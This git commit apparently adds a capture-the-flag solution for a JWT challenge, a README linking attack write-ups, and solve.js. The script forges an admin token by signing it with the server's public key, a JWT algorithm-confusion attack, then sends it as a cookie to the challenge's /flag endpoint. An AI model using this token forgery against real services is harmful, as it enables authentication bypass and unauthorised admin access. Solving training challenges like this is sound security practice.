ee2b7352a133c0b1a249064cef2048b598113507
Alexis Auriac <alexis.auriac@epitech.eu>
2022-12-05 15:44:20 +0100

    mythique2 done (README not done yet)

---
+++ jwt/mythique2/README.md
@@ -0,0 +1,4 @@
+# mythique2
+
+hs256 vs rs256: https://stackoverflow.com/a/39239395/12864941
+jwt attacks: https://debricked.com/blog/json-web-tokens/
---
+++ jwt/mythique2/solve.js
@@ -0,0 +1,32 @@
+import fs from 'fs/promises'
+import jwt from 'jsonwebtoken'
+import axios from 'axios'
+
+const url = 'https://mythique2.secu-web.blackfoot.dev'
+
+async function makeToken() {
+  const pubkey = await fs.readFile('serverkey.pub')
+
+  return jwt.sign(
+    { data: { name: "Hack3r", isAdmin: true } },
+    pubkey,
+    { expiresIn: '10d' },
+  )
+}
+
+async function main() {
+  const token = await makeToken()
+  console.log(`token: ${token}`)
+
+  const res = await axios({
+    method: 'get',
+    url: `${url}/flag`,
+    headers: {
+      Cookie: `authToken=${token}`,
+    }
+  })
+
+  console.log(`flag: ${res.data.flag}`)
+}
+
+main()
